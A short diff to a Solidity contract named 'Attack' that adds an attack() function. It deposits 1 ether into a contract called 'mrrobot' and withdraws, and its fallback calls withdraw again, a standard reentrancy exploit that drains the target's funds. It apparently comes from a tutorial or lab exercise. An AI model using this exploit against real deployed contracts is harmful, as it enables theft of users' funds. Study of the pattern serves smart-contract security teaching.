@@ -16,3 +16,15 @@ contract Attack {
             mrrobot.withdraw();
         }
     }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        mrrobot.deposit{value: 1 ether}();
+        mrrobot.withdraw();
+    }
+    
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+
+}
